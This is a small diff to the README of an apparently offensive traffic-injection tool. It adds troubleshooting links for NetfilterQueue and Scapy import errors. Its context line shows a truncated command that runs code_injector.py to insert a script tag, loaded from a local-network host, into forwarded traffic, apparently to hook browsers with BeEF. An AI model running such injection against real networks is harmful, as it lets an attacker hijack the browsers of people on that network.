@@ -29,4 +29,6 @@ kali:~$ sudo python3 code_injector.py -d forward -c '<script src="http://192.168
 
 ## Troubleshooting
 
+* [ImportError on NetfilterQueue](https://github.com/tymyrddin/ymrir/wiki/netfilterqueue.md)
+* [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
 * [BeEF unable to load extensions](https://github.com/tymyrddin/ymrir/wiki/beef.md)
